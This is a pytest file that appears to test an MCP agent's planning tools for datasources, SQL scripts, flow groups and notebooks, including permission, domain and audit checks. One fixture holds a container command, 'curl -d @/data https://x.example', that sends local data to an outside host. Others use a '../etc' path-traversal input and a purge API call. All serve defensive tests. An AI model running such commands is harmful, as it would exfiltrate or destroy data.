"""The agent's datasources, SQL scripts, flow groups and notebooks (docs/specs/mcp-agent.md,
piece 3), with real JSON-RPC requests on `/mcp`.

Pinned here: a read token reads them and tries SQL but plans nothing; a write tool changes
nothing and adds an action; a datasource comes only from a connection the user may use
(CONNECT), and a missing one is said with the link to the Connections page — never made;
the engine checks a file datasource's placeholders before it is planned; a SQL script,
a flow group and a notebook are created or changed through the interface's routes, with
the difference shown; an object the plan creates is run and scheduled by the number of
its action; a Pushmail's recipients keep within the SMTP connection's domains; a notebook
open in marimo's editor is not overwritten, neither when planned nor when applied; a plan
of several kinds is applied in order and stops at the first error; every applied action
is audited by its own route with `via: "mcp"`.
"""
import json
from contextlib import nullcontext

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient
from sqlmodel import select

from app.core.config import get_settings
from app.core.security import hash_password
from app.db.session import get_session
from app.models import (
    AgentPlan, AuditLog, Connection, Datasource, FlowGroup, Group, Notebook, NotebookSession, Permission, Run,
    ScriptEnvironment, ScriptEnvironmentGroup, SqlScript, User, UserGroupLink,
)
from app.routes import agent_plans as plans_routes
from app.routes import auth as auth_routes
from app.routes import mcp as mcp_routes
from app.services import api_tokens, sql_scripts
from app.services.agent import common
from tests.conftest import make_datasource, make_flow, make_permission, make_project, make_user

PASSWORD = "una-password-lunga"
CSRF = {"X-Tabularia-Csrf": "1"}
COLUMNS = [{"name": "status", "dtype": "String"}, {"name": "amount", "dtype": "Float64"}]
FLOW = {"nodes": [{"id": "out-1", "type": "output", "data": {"destType": "datasource", "name": "x", "overwrite": True}}],
        "edges": []}


@pytest.fixture
def app(session, fake_engine, monkeypatch):
    app = FastAPI()
    for r in (auth_routes.router, mcp_routes.router, plans_routes.router):
        app.include_router(r)
    app.dependency_overrides[get_session] = lambda: session
    monkeypatch.setattr(common, "new_session", lambda: nullcontext(session))
    return app


@pytest.fixture
def world(session):
    """Anna edits «Sales» and uses its connections (a database, S3, SFTP, SMTP limited to
    acme.com); Bruno only views «Sales»; «Secret» is nobody's. Ids only."""
    anna = make_user(session, email="anna@x.local", hashed_password=hash_password(PASSWORD))
    bruno = make_user(session, email="bruno@x.local", hashed_password=hash_password(PASSWORD))
    sales = make_project(session, name="Sales")
    secret = make_project(session, name="Secret")
    make_permission(session, user_id=anna.id, project_id=sales.id, capability="edit")
    make_permission(session, user_id=anna.id, project_id=sales.id, capability="connect")
    make_permission(session, user_id=bruno.id, project_id=sales.id, capability="view")
    make_permission(session, user_id=bruno.id, project_id=sales.id, capability="connect")
    orders = make_datasource(session, name="orders", project_id=sales.id, key="datasets/1/o.parquet", rows=10,
                             columns=json.dumps(COLUMNS))
    conns = {
        "db": Connection(name="Warehouse", project_id=sales.id, db_type="postgresql", host="db.internal.example",
                         username="loader", password_encrypted="gAAAA-very-secret", database="dwh"),
        "lake": Connection(name="Lake", project_id=sales.id, db_type="s3", host="", username="AKIA",
                           password_encrypted="gAAAA-s3", database="landing"),
        "drop": Connection(name="Drop", project_id=sales.id, db_type="sftp", host="sftp.example", username="tab",
                           password_encrypted="gAAAA-sftp"),
        "mail": Connection(name="Mail", project_id=sales.id, db_type="smtp", host="smtp.internal.example",
                           username="mailer", password_encrypted="gAAAA-mail-secret",
                           extra=json.dumps({"allowed_domains": ["acme.com"]})),
        "hidden": Connection(name="Hidden", project_id=secret.id, db_type="postgresql", host="h", password_encrypted="x"),
    }
    session.add_all(conns.values())
    session.commit()
    ids = dict(anna=anna.id, bruno=bruno.id, sales=sales.id, secret=secret.id, orders=orders.id,
               **{k: c.id for k, c in conns.items()})
    _, ids["write"] = api_tokens.create(session, anna, "claude desktop", "write", 30, anna)
    _, ids["read"] = api_tokens.create(session, anna, "reader", "read", 30, anna)
    _, ids["bruno_write"] = api_tokens.create(session, bruno, "bruno's", "write", 30, bruno)
    return ids


def call(client, token, tool_name, /, **arguments):
    """tools/call → (is_error, the tool's answer: a dict, or the error's words)."""
    r = client.post("/mcp", json={"jsonrpc": "2.0", "id": 1, "method": "tools/call",
                                  "params": {"name": tool_name, "arguments": arguments}},
                    headers={"Authorization": f"Bearer {token}", "MCP-Protocol-Version": "2025-06-18"})
    assert r.status_code == 200, r.text
    body = r.json()
    assert "result" in body, body
    text = body["result"]["content"][0]["text"]
    return body["result"]["isError"], (text if body["result"]["isError"] else json.loads(text))


def ok(client, token, tool_name, /, **arguments):
    is_error, out = call(client, token, tool_name, **arguments)
    assert not is_error, out
    return out


def refused(client, token, tool_name, /, **arguments) -> str:
    is_error, words = call(client, token, tool_name, **arguments)
    assert is_error, words
    return words


def audit_detail(session, action):
    return [json.loads(a.detail or "{}") for a in session.exec(select(AuditLog).where(AuditLog.action == action)).all()]


def _database_datasource(session, w, name="customers"):
    return make_datasource(session, name=name, project_id=w["sales"], kind="database", connection_id=w["db"],
                           source_type="table", source_ref="public.customers", key="datasets/9/c.parquet").id


# ── the levels ────────────────────────────────────────────────────────────────

def test_a_read_token_reads_the_new_objects_and_plans_nothing(app, world):
    c = TestClient(app)
    listed = c.post("/mcp", json={"jsonrpc": "2.0", "id": 1, "method": "tools/list"},
                    headers={"Authorization": f"Bearer {world['read']}"}).json()["result"]["tools"]
    names = {t["name"] for t in listed}
    assert {"get_sql_script", "get_flow_group", "get_notebook", "run_sql_preview", "list_tables", "list_columns",
            "list_files"} <= names
    assert not {n for n in names if n.startswith("plan_")}
    r = c.post("/mcp", json={"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {
        "name": "plan_create_datasource", "arguments": {"folder_id": world["sales"], "connection_id": world["db"],
                                                        "name": "x", "source": {"type": "table", "table": "t"}}}},
               headers={"Authorization": f"Bearer {world['read']}"})
    assert "write token" in r.json()["error"]["message"]
    writing = {t["name"]: t for t in c.post("/mcp", json={"jsonrpc": "2.0", "id": 1, "method": "tools/list"},
                                            headers={"Authorization": f"Bearer {world['write']}"}).json()["result"]["tools"]}
    for name in ("plan_create_datasource", "plan_refresh_datasource", "plan_sql_script", "plan_run_sql_script",
                 "plan_flow_group", "plan_run_flow_group", "plan_notebook"):
        assert writing[name]["annotations"]["destructiveHint"] is False, name
    assert "planned_action" in writing["plan_schedule"]["inputSchema"]["properties"]
    # the source of a datasource is one of six shapes, told apart by its type
    source = writing["plan_create_datasource"]["inputSchema"]["properties"]["source"]
    assert source["discriminator"]["propertyName"] == "type" and len(source["oneOf"]) == 6


# ── datasources from existing connections ─────────────────────────────────────

def test_a_datasource_is_created_from_a_table_imported_and_scheduled(app, world, session, fake_engine):
    c = TestClient(app)
    plan = ok(c, world["write"], "plan_create_datasource", folder_id=world["sales"], connection_id=world["db"],
              name="customers", description="Who buys", source={"type": "table", "table": "public.customers"})
    assert plan["actions"][0]["kind"] == "create_datasource"
    assert "«customers» in Sales from the table public.customers through «Warehouse»" in plan["actions"][0]["words"]
    plan = ok(c, world["write"], "plan_schedule", kind="datasource", planned_action=1, cron="0 6 * * *")
    assert [a["kind"] for a in plan["actions"]] == ["create_datasource", "schedule_datasource"]
    assert session.exec(select(Datasource).where(Datasource.name == "customers")).first() is None
    assert not fake_engine.ingests  # nothing imported yet

    done = ok(c, world["write"], "confirm_plan", plan_id=plan["plan_id"])
    assert done["status"] == "applied", done
    ds = session.exec(select(Datasource).where(Datasource.name == "customers")).one()
    assert (ds.kind, ds.source_type, ds.source_ref, ds.connection_id) == ("database", "table", "public.customers", world["db"])
    assert ds.refresh_schedule == "0 6 * * *" and ds.refresh_scheduled_by == world["anna"]
    assert [route for route, _ in fake_engine.ingests] == ["/db/ingest"]  # its first import, by the route
    assert done["result"][0]["link"].endswith(f"&ds={ds.id}")
    created = audit_detail(session, "datasource.create")[0]
    assert created["via"] == "mcp" and created["plan"] == plan["plan_id"] and created["token"] == "claude desktop"
    assert audit_detail(session, "datasource.schedule")[0]["via"] == "mcp"


def test_a_connection_that_is_missing_is_said_with_the_link_never_made(app, world, session):
    c = TestClient(app)
    args = dict(folder_id=world["sales"], name="customers", source={"type": "table", "table": "public.customers"})
    for connection in (424242, world["hidden"]):  # not there, or in a folder without CONNECT: the same words
        words = refused(c, world["write"], "plan_create_datasource", connection_id=connection, **args)
        assert f"No connection {connection} is available" in words and "never creates" in words
        assert "/connections" in words and "list_connections" in words
    assert len(session.exec(select(Connection)).all()) == 5  # none made
    # the right kind of connection for the source
    words = refused(c, world["write"], "plan_create_datasource", connection_id=world["mail"], **args)
    assert "not a database" in words
    words = refused(c, world["write"], "plan_create_datasource", connection_id=world["db"], folder_id=world["sales"],
                    name="files", source={"type": "s3", "pattern": "*.csv"})
    assert "needs a s3 connection" in words
    # EDIT on the folder: Bruno views it and has CONNECT, but cannot create there
    words = refused(c, world["bruno_write"], "plan_create_datasource", connection_id=world["db"], **args)
    assert "cannot create datasources" in words
    # a name already taken in the folder
    words = refused(c, world["write"], "plan_create_datasource", connection_id=world["db"],
                    **{**args, "name": "orders"})
    assert "already a datasource 'orders'" in words
    assert session.exec(select(AgentPlan)).first() is None


def test_the_engine_checks_a_file_datasources_placeholders_before_it_is_planned(app, world, session, fake_engine):
    c = TestClient(app)
    fake_engine.s3_responses["validate"] = (400, {"detail": "Unknown placeholder {dat}"})
    words = refused(c, world["write"], "plan_create_datasource", folder_id=world["sales"], connection_id=world["lake"],
                    name="landing", source={"type": "s3", "folder": "in", "pattern": "sales_{dat}.csv"})
    assert "The engine refuses the source" in words and "{dat}" in words
    fake_engine.s3_responses["validate"] = (200, {"ok": True, "expansions": 1})
    plan = ok(c, world["write"], "plan_create_datasource", folder_id=world["sales"], connection_id=world["lake"],
              name="landing", source={"type": "s3", "folder": "in", "pattern": "sales_{date}.csv", "format": "csv"})
    assert "the S3 files landing/in/sales_{date}.csv" in plan["actions"][0]["words"]  # the connection's bucket
    assert fake_engine.s3_inspects[-1]["action"] == "validate"
    # SFTP: '..' is refused by the route's own model
    words = refused(c, world["write"], "plan_create_datasource", folder_id=world["sales"], connection_id=world["drop"],
                    name="drop", source={"type": "sftp", "folder": "../etc", "pattern": "*.csv"})
    assert "'..' is not allowed" in words
    done = ok(c, world["write"], "confirm_plan", plan_id=plan["plan_id"])
    assert done["status"] == "applied"
    ds = session.exec(select(Datasource).where(Datasource.name == "landing")).one()
    assert ds.source_type == "s3" and json.loads(ds.source_ref)["pattern"] == "sales_{date}.csv"


def test_a_refresh_needs_run_and_connect_and_goes_through_the_route(app, world, session, fake_engine):
    c = TestClient(app)
    ds_id = _database_datasource(session, world)
    words = refused(c, world["write"], "plan_refresh_datasource", datasource_id=world["orders"])
    assert "not imported from a connection" in words
    words = refused(c, world["bruno_write"], "plan_refresh_datasource", datasource_id=ds_id)
    assert "needs RUN" in words
    plan = ok(c, world["write"], "plan_refresh_datasource", datasource_id=ds_id)
    assert "Refresh the datasource «customers» in Sales now" in plan["actions"][0]["words"]
    done = ok(c, world["write"], "confirm_plan", plan_id=plan["plan_id"])
    assert done["status"] == "applied" and len(fake_engine.ingests) == 1
    assert done["result"][0]["object"]["kind"] == "run"
    assert audit_detail(session, "datasource.refresh")[0]["via"] == "mcp"


def test_the_tables_and_files_of_a_connection_are_read_with_connect(app, world, fake_engine):
    c = TestClient(app)
    fake_engine.db_responses["tables"] = (200, {"tables": ["public.customers", "public.orders"]})
    out = ok(c, world["read"], "list_tables", connection_id=world["db"])
    assert out == {"connection": "Warehouse", "tables": ["public.customers", "public.orders"]}
    assert "/connections" in refused(c, world["read"], "list_tables", connection_id=world["hidden"])
    assert "not a database" in refused(c, world["read"], "list_tables", connection_id=world["mail"])
    fake_engine.db_responses["columns"] = (200, {"columns": [{"name": "id", "type": "int"}]})
    assert ok(c, world["read"], "list_columns", connection_id=world["db"], table="public.customers")["columns"] == [
        {"name": "id", "type": "int"}]
    fake_engine.s3_responses["files"] = (200, {"files": [{"key": "in/a.csv"}], "total": 1})
    assert ok(c, world["read"], "list_files", connection_id=world["lake"], folder="in", pattern="*.csv")["files"] == [
        {"key": "in/a.csv"}]


# ── SQL scripts ───────────────────────────────────────────────────────────────

def test_a_sql_script_is_created_written_and_scheduled_in_one_plan(app, world, session, fake_engine):
    fake_engine.preview_response = (200, {"columns": [{"name": "status", "dtype": "String"}], "rows": [{"status": "open"}],
                                          "row_count": 1, "truncated": False})
    c = TestClient(app)
    plan = ok(c, world["write"], "plan_sql_script", folder_id=world["sales"], name="Open orders",
              sql="SELECT * FROM orders WHERE status = 'open'", output={"name": "open orders", "folder_id": world["sales"]})
    assert "Create the SQL script «Open orders» in Sales, running on the catalog" in plan["actions"][0]["words"]
    assert "writes the datasource «open orders» in Sales" in plan["actions"][0]["words"]
    # its first rows, for the plan, on a preview slot of its own
    assert fake_engine.previews[-1]["slot"].startswith(f"u{world['anna']}:agent:")
    ok(c, world["write"], "plan_run_sql_script", planned_action=1)
    plan = ok(c, world["write"], "plan_schedule", kind="sql_script", planned_action=1, cron="0 7 * * 1-5")
    assert [a["kind"] for a in plan["actions"]] == ["save_sql_script", "run_sql_script", "schedule_sql_script"]
    assert session.exec(select(SqlScript)).first() is None

    browser = TestClient(app)
    browser.post("/auth/login", json={"email": "anna@x.local", "password": PASSWORD}, headers=CSRF)
    page = browser.get(f"/agent/plans/{plan['plan_id']}").json()
    first = page["actions"][0]
    assert "definition" not in first and first["code"] == "SELECT * FROM orders WHERE status = 'open'"
    assert first["preview"]["rows"] == [{"status": "open"}] and first["output"] == {"name": "open orders", "folder": "Sales"}

    done = ok(c, world["write"], "confirm_plan", plan_id=plan["plan_id"])
    assert done["status"] == "applied", done
    script = session.exec(select(SqlScript)).one()
    assert script.run_schedule == "0 7 * * 1-5" and script.run_scheduled_by == world["anna"]
    write = session.exec(select(Run).where(Run.sql_script_id == script.id, Run.kind == "sql")).one()
    assert done["result"][1]["object"]["id"] == write.id and len(fake_engine.transforms) == 1
    assert done["result"][0]["link"].endswith(f"/sql-script?id={script.id}")
    assert audit_detail(session, "sql_script.create")[0]["via"] == "mcp"
    assert audit_detail(session, "sql_script.schedule")[0]["via"] == "mcp"


def test_a_saved_sql_script_is_changed_with_the_difference_of_its_sql(app, world, session):
    c = TestClient(app)
    ok(c, world["write"], "plan_sql_script", folder_id=world["sales"], name="Totals", sql="SELECT status\nFROM orders")
    ok(c, world["write"], "confirm_plan", plan_id=session.exec(select(AgentPlan)).one().id)
    script_id = session.exec(select(SqlScript)).one().id
    seen = ok(c, world["read"], "get_sql_script", sql_script_id=script_id)
    assert seen["sql"] == "SELECT status\nFROM orders" and seen["runs_on"] == "catalog" and seen["can_edit"]

    words = refused(c, world["write"], "plan_sql_script", sql_script_id=script_id, sql="SELECT status\nFROM orders",
                    name="Totals")
    assert "change nothing" in words
    plan = ok(c, world["write"], "plan_sql_script", sql_script_id=script_id, sql="SELECT status, amount\nFROM orders")
    changes = plan["actions"][0]["changes"]
    assert "-SELECT status" in changes and "+SELECT status, amount" in changes
    # a second change of the same script goes on from the first, in its place
    plan = ok(c, world["write"], "plan_sql_script", sql_script_id=script_id,
              output={"name": "totals", "folder_id": world["sales"]})
    assert len(plan["actions"]) == 1
    changes = plan["actions"][0]["changes"]
    assert "+SELECT status, amount" in changes and "~ writes the datasource: — → «totals» in Sales" in changes
    # someone saves the script in Tabularia after the plan was made: nothing is overwritten
    script = session.get(SqlScript, script_id)
    sql_scripts.add_version(session, script, {**sql_scripts.empty_content(), "sql": "SELECT 1 FROM orders"}, "edited",
                            session.get(User, world["bruno"]))
    session.commit()
    done = ok(c, world["write"], "confirm_plan", plan_id=plan["plan_id"])
    assert done["status"] == "failed" and "changed in Tabularia" in done["result"][0]["error"]
    session.expire_all()
    assert session.get(SqlScript, script_id).current_version == 2
    # planned again on the current version, it is saved
    plan = ok(c, world["write"], "plan_sql_script", sql_script_id=script_id, sql="SELECT status, amount\nFROM orders",
              output={"name": "totals", "folder_id": world["sales"]})
    assert ok(c, world["write"], "confirm_plan", plan_id=plan["plan_id"])["status"] == "applied"
    session.expire_all()
    content = sql_scripts.content_of(session, session.get(SqlScript, script_id))
    assert content["sql"] == "SELECT status, amount\nFROM orders"
    assert content["output"] == {"name": "totals", "project_id": world["sales"]}
    assert audit_detail(session, "sql_script.update")[0]["via"] == "mcp"


def test_sql_on_a_connection_needs_connect_and_a_read_token_may_try_it(app, world, session, fake_engine):
    c = TestClient(app)
    words = refused(c, world["write"], "plan_sql_script", folder_id=world["sales"], name="Hidden",
                    sql="SELECT 1", connection_id=world["hidden"])
    assert "No connection" in words and "/connections" in words
    words = refused(c, world["read"], "run_sql_preview", sql="SELECT 1", connection_id=world["hidden"])
    assert "No connection" in words
    fake_engine.db_query_response = (200, {"columns": [{"name": "n"}], "rows": [{"n": 1}], "row_count": 1, "truncated": False})
    out = ok(c, world["read"], "run_sql_preview", sql="SELECT 1 AS n", connection_id=world["db"])
    assert out["rows"] == [{"n": 1}] and out["connection"]["name"] == "Warehouse"
    assert fake_engine.db_queries[-1]["slot"].startswith(f"u{world['anna']}:agent:")
    detail = audit_detail(session, "sql_script.run")[-1]
    assert detail["via"] == "mcp" and detail["token"] == "reader" and detail["sql"] == "SELECT 1 AS n"
    # a script that writes no datasource cannot be planned to write it
    ok(c, world["write"], "plan_sql_script", folder_id=world["sales"], name="Plain", sql="SELECT * FROM orders")
    assert "writes no datasource" in refused(c, world["write"], "plan_run_sql_script", planned_action=1)


# ── flow groups ───────────────────────────────────────────────────────────────

def _pushmail(w, to="boss@acme.com"):
    return {"label": "Daily", "connectionId": w["mail"], "to": [to], "subject": "Orders {date}",
            "attachments": [{"datasourceId": w["orders"], "fileName": "orders"}]}


def test_a_flow_group_is_created_run_and_scheduled(app, world, session):
    c = TestClient(app)
    flow_id = make_flow(session, name="Prepare", project_id=world["sales"], definition=json.dumps(FLOW)).id
    ds_id = _database_datasource(session, world)
    steps = [[{"kind": "flow", "id": flow_id}, {"kind": "refresh", "id": ds_id}],
             [{"kind": "pushmail", "pushmail": _pushmail(world)}]]
    plan = ok(c, world["write"], "plan_flow_group", folder_id=world["sales"], name="Morning", steps=steps)
    assert "Create the flow group «Morning» in Sales: 2 steps, 3 cells" in plan["actions"][0]["words"]
    ok(c, world["write"], "plan_run_flow_group", planned_action=1)
    plan = ok(c, world["write"], "plan_schedule", kind="flow_group", planned_action=1, cron="30 6 * * *")
    browser = TestClient(app)
    browser.post("/auth/login", json={"email": "anna@x.local", "password": PASSWORD}, headers=CSRF)
    lines = browser.get(f"/agent/plans/{plan['plan_id']}").json()["actions"][0]["node_lines"]
    assert lines[0] == f"step 1: run the flow «Prepare» (flow {flow_id})"
    assert lines[2].startswith("step 2: email «Daily» to boss@acme.com")

    done = ok(c, world["write"], "confirm_plan", plan_id=plan["plan_id"])
    assert done["status"] == "applied", done
    group = session.exec(select(FlowGroup)).one()
    group_id = group.id
    assert group.run_schedule == "30 6 * * *" and group.run_scheduled_by == world["anna"]
    cells = json.loads(group.definition)["steps"]
    assert cells[1][0]["kind"] == "pushmail" and cells[1][0]["id"] == 1  # numbered as the interface does
    queued = session.exec(select(Run).where(Run.flow_group_id == group_id)).one()
    assert done["result"][1]["object"]["id"] == queued.id and queued.status == "PENDING"
    assert audit_detail(session, "flow_group.create")[0]["via"] == "mcp"
    assert audit_detail(session, "flow_group.run")[0]["via"] == "mcp"

    # read back, and changed: the Pushmail kept by its number alone, a cell added
    seen = ok(c, world["read"], "get_flow_group", flow_group_id=group_id)
    assert seen["steps"][1][0]["to"] == ["boss@acme.com"] and seen["steps"][0][0]["name"] == "Prepare"
    other = make_flow(session, name="Second", project_id=world["sales"], definition=json.dumps(FLOW)).id
    plan = ok(c, world["write"], "plan_flow_group", flow_group_id=group_id, steps=[
        [{"kind": "flow", "id": flow_id}, {"kind": "refresh", "id": ds_id}, {"kind": "flow", "id": other}],
        [{"kind": "pushmail", "id": 1}]])
    assert plan["actions"][0]["changes"] == [f"+ step 1: run the flow «Second» (flow {other})"]
    assert ok(c, world["write"], "confirm_plan", plan_id=plan["plan_id"])["status"] == "applied"
    session.expire_all()
    cells = json.loads(session.get(FlowGroup, group_id).definition)["steps"]
    assert len(cells[0]) == 3 and cells[1][0]["pushmail"]["to"] == ["boss@acme.com"]


def test_a_pushmail_keeps_within_the_domains_and_a_cell_must_be_runnable(app, world, session):
    c = TestClient(app)
    words = refused(c, world["write"], "plan_flow_group", folder_id=world["sales"], name="Leak",
                    steps=[[{"kind": "pushmail", "pushmail": _pushmail(world, to="boss@gmail.com")}]])
    assert "outside the domains" in words and "boss@gmail.com" in words
    hidden_flow = make_flow(session, name="Payroll", project_id=world["secret"], definition=json.dumps(FLOW)).id
    words = refused(c, world["write"], "plan_flow_group", folder_id=world["sales"], name="Peek",
                    steps=[[{"kind": "flow", "id": hidden_flow}]])
    assert f"flow {hidden_flow} not found" in words
    assert "No flow group" in refused(c, world["read"], "get_flow_group", flow_group_id=999)
    assert "needs its settings" in refused(c, world["write"], "plan_flow_group", folder_id=world["sales"], name="X",
                                           steps=[[{"kind": "pushmail"}]])
    assert session.exec(select(AgentPlan)).first() is None


# ── notebooks ─────────────────────────────────────────────────────────────────

SOURCE = "import marimo\n\napp = marimo.App()\n\n\n@app.cell\ndef _():\n    return\n"


@pytest.fixture
def scripting(monkeypatch):
    for k, v in {"SCRIPTS__ENABLED": "true", "SCRIPTS__NAMESPACE": "tab-scripts",
                 "SCRIPTS__REGISTRY": "registry.example.com/tab"}.items():
        monkeypatch.setenv(k, v)
    get_settings.cache_clear()
    yield
    get_settings.cache_clear()


def _python(session, w) -> int:
    env = ScriptEnvironment(name="Python", language="python")
    g = Group(name="data science")
    session.add_all([env, g])
    session.commit()
    session.add_all([ScriptEnvironmentGroup(environment_id=env.id, group_id=g.id),
                     UserGroupLink(user_id=w["anna"], group_id=g.id), UserGroupLink(user_id=w["bruno"], group_id=g.id)])
    session.commit()
    return env.id


def test_notebooks_need_the_scripting_environments(app, world):
    c = TestClient(app)
    for tool_name, args in (("plan_notebook", {"folder_id": world["sales"], "name": "X", "environment_id": 1}),
                            ("get_notebook", {"notebook_id": 1})):
        assert "Kubernetes" in refused(c, world["write"], tool_name, **args)


def _editor(session, session_id, status):
    row = session.get(NotebookSession, session_id)
    row.status = status
    session.add(row)
    session.commit()


def test_a_notebook_is_created_and_changed_but_not_while_open_in_the_editor(app, world, session, scripting):
    c = TestClient(app)
    env_id = _python(session, world)
    assert "not valid Python" in refused(c, world["write"], "plan_notebook", folder_id=world["sales"], name="Broken",
                                         environment_id=env_id, source="def (:\n")
    plan = ok(c, world["write"], "plan_notebook", folder_id=world["sales"], name="Sales app", environment_id=env_id)
    assert "with this user's rights" in plan["actions"][0]["words"]
    ok(c, world["write"], "confirm_plan", plan_id=plan["plan_id"])
    nb = session.exec(select(Notebook)).one()
    nb_id = nb.id
    assert nb.current_version == 1 and audit_detail(session, "notebook.create")[0]["via"] == "mcp"
    seen = ok(c, world["read"], "get_notebook", notebook_id=nb_id)
    assert seen["author"] == "anna@x.local" and "marimo.App()" in seen["source"]

    # Bruno has marimo's editor open on it: the plan is refused...
    editing = NotebookSession(notebook_id=nb_id, mode="edit", user_id=world["bruno"], version=1, namespace="tab-scripts",
                              job_name="nb-edit", status="ready", token_fp="x" * 64)
    session.add(editing)
    session.commit()
    editing_id = editing.id
    words = refused(c, world["write"], "plan_notebook", notebook_id=nb_id, source=SOURCE)
    assert "open in marimo's editor by bruno@x.local" in words
    # ...and a plan made while it was closed stops when it is applied, if it opened meanwhile
    _editor(session, editing_id, "stopped")
    plan = ok(c, world["write"], "plan_notebook", notebook_id=nb_id, source=SOURCE)
    assert any(line.startswith("-") for line in plan["actions"][0]["changes"])
    _editor(session, editing_id, "starting")
    done = ok(c, world["write"], "confirm_plan", plan_id=plan["plan_id"])
    assert done["status"] == "failed" and "open in marimo's editor" in done["result"][0]["error"]
    session.expire_all()
    assert session.get(Notebook, nb_id).current_version == 1


# ── a plan of several kinds ───────────────────────────────────────────────────

def test_a_mixed_plan_is_applied_in_order_and_stops_at_the_first_error(app, world, session, fake_engine):
    c = TestClient(app)
    flow_id = make_flow(session, name="Prepare", project_id=world["sales"], definition=json.dumps(FLOW)).id
    ok(c, world["write"], "plan_create_datasource", folder_id=world["sales"], connection_id=world["db"],
       name="customers", source={"type": "sql", "sql": "SELECT * FROM customers"})
    ok(c, world["write"], "plan_sql_script", folder_id=world["sales"], name="Totals", sql="SELECT * FROM orders")
    plan = ok(c, world["write"], "plan_flow_group", folder_id=world["sales"], name="Night",
              steps=[[{"kind": "flow", "id": flow_id}]])
    assert [a["kind"] for a in plan["actions"]] == ["create_datasource", "save_sql_script", "save_flow_group"]
    # meanwhile someone makes a SQL script of that name in the folder
    session.add(SqlScript(name="Totals", project_id=world["sales"], owner_id=world["bruno"]))
    session.commit()

    done = ok(c, world["write"], "confirm_plan", plan_id=plan["plan_id"])
    assert done["status"] == "failed"
    assert [r["ok"] for r in done["result"]] == [True, False, False]
    assert "already a SQL script 'Totals'" in done["result"][1]["error"] and done["result"][2]["skipped"]
    assert session.exec(select(Datasource).where(Datasource.name == "customers")).one().source_type == "sql"
    assert session.exec(select(FlowGroup)).first() is None
    applied = audit_detail(session, "agent.plan_apply")[0]
    assert applied["actions"] == ["create_datasource", "save_sql_script", "save_flow_group"]
    assert applied["ok"] == [True, False, False]


def test_the_permissions_are_checked_again_for_every_kind_when_applied(app, world, session, fake_engine):
    c = TestClient(app)
    ds_id = _database_datasource(session, world)
    plan = ok(c, world["write"], "plan_refresh_datasource", datasource_id=ds_id)
    for p in session.exec(select(Permission).where(Permission.user_id == world["anna"],
                                                   Permission.capability == "connect")).all():
        session.delete(p)
    session.commit()
    done = ok(c, world["write"], "confirm_plan", plan_id=plan["plan_id"])
    assert done["status"] == "failed" and not fake_engine.ingests


# ── what will run is on the plan, whole (bug hunt 2026-10-28) ────────────────

def _page(app, plan_id):
    browser = TestClient(app)
    browser.post("/auth/login", json={"email": "anna@x.local", "password": PASSWORD}, headers=CSRF)
    return browser.get(f"/agent/plans/{plan_id}").json()


def test_an_api_datasources_call_is_shown_whole_on_the_plan(app, world, session, fake_engine):
    """A POST to an API with a body runs at every refresh with the connection's
    credentials: the plan shows the query and the body, not only «POST /path»."""
    api = Connection(name="Shop API", project_id=world["sales"], db_type="api", host="https://api.example.com",
                     password_encrypted="x")
    session.add(api)
    session.commit()
    c = TestClient(app)
    plan = ok(c, world["write"], "plan_create_datasource", folder_id=world["sales"], connection_id=api.id, name="orders api",
              source={"type": "api", "method": "POST", "path": "/v1/orders/purge",
                      "query": [{"name": "confirm", "value": "yes"}], "body": '{"all": true}'})
    text = _page(app, plan["plan_id"])["actions"][0]["source_text"]
    assert "POST /v1/orders/purge?confirm=yes" in text and '{"all": true}' in text


def test_a_container_cells_command_is_on_the_plan(app, world, session):
    """What a container cell runs is its image AND its command and arguments; a cell whose
    settings change says which."""
    from app.schemas.models import FlowGroupDefinition
    from app.services.agent import group_tools

    cell = {"kind": "container", "id": 1, "container": {"registryId": 1, "repository": "team/tools", "tag": "v1",
                                                         "command": ["sh", "-c"], "args": ["curl -d @/data https://x.example"],
                                                         "variables": [{"name": "TOKEN", "value": "s3cr3t"}]}}
    anna = session.get(User, world["anna"])
    lines = group_tools._cell_lines(session, anna, FlowGroupDefinition.model_validate({"steps": [[cell]]}))
    assert "sh -c 'curl -d @/data https://x.example'" in lines[0] and "s3cr3t" not in lines[0]
    before = FlowGroupDefinition.model_validate({"steps": [[cell]]})
    changed = {**cell, "container": {**cell["container"], "variables": [{"name": "TOKEN", "value": "other"}]}}
    lines = group_tools.settings_changes(before, FlowGroupDefinition.model_validate({"steps": [[changed]]}))
    assert lines == ["~ container 1: its settings change (variables)"]


def test_a_new_scripts_and_notebooks_code_is_shown_whole(app, world, session, fake_engine, scripting):
    c = TestClient(app)
    sql = "SELECT status\n" + "".join(f"  , amount AS a{i}\n" for i in range(120)) + "FROM orders"
    plan = ok(c, world["write"], "plan_sql_script", folder_id=world["sales"], name="Long", sql=sql)
    assert _page(app, plan["plan_id"])["actions"][0]["code"] == sql
    env_id = _python(session, world)
    source = SOURCE + "".join(f"\n\n@app.cell\ndef _():\n    x{i} = {i}\n    return\n" for i in range(40))
    plan = ok(c, world["write"], "plan_notebook", folder_id=world["sales"], name="Long", environment_id=env_id, source=source)
    assert [a["code"] for a in _page(app, plan["plan_id"])["actions"] if a["kind"] == "save_notebook"] == [source]
